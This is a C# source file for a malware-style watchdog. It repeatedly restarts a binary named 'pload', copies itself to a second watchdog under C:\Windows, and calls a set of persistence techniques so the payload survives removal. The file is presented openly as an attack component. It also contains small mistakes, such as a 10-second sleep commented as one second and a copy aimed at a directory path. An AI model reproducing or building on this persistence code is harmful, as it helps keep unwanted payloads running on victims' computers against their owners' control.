using System;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using Microsoft.Win32;
using watchdogHelper;

/*
    This watch is constantly monitoring the secondary watchdog and the binary

Watchdog Functionality
    If either of the above watched binaries stop running or existing, this watchdog will copy and/or run them. Will not run anything that is currently running
    If the watched binaries stop existing in the current directory or in the destination directory, then 


Persistence functionality
    As long as this watchdog file is running, then everythign else is running in theory. So I set up a ton of persistence techniques to run this watchdog.
    Basically all of the persistence techniques will be iterated through, verified if they are set up correctly, then set up if not existing or set up correctly
*/


class Watchdog
{
    public static string? BinaryPath { get; private set; } = @"C:\Windows\Test2";
    public static string? BinaryName { get; private set; } = "pload";


 
    public static string? SecondaryWatchdogPath { get; private set; } = @"C:\Windows\Test\Test1";
    public static string? SecondaryWatchdogName { get; private set; } = "Wdog2";
    public static string? SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";


    public static string? PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Test";
    public static string? PrimaryWatchdogName { get; private set; } = "Wdog1";
    public static string? PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";


    static void Main(string[] args)
    {
        // Create or open the mutex to ensure only one instance is running
        using (Mutex mutex = new Mutex(false, PrimaryWatchdogMutexName, out bool isNewInstance))
        {
            if (!isNewInstance)
            {
                    //Watchdog process is already running. Exiting.
                return;
            }

            
                WatchdogLogic();
        }
    }


    static void WatchdogLogic()
    {
        string BinaryFullPath = Path.Combine(BinaryPath, BinaryName);
        string SecondaryWatchdogFullPath = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);
        File.Copy(Path.Combine(Directory.GetCurrentDirectory(), PrimaryWatchdogName), SecondaryWatchdogPath, overwrite: false);

        // Example loop to simulate frequent checks
        while (true)
        {
            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(BinaryPath, BinaryName);
            watchdogHelper.watchdogHelper.CheckAndRunPayload(BinaryPath, BinaryName);

            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(SecondaryWatchdogPath, SecondaryWatchdogName);
            watchdogHelper.watchdogHelper.CheckAndRunWatchdog(SecondaryWatchdogPath, SecondaryWatchdogName, SecondaryWatchdogMutexName);

            Persistence.Persistence.runAllTechniques();

            Console.WriteLine("Watchdog is monitoring...");
            Thread.Sleep(10000);  // Sleep for 1 second
        }
    }

}

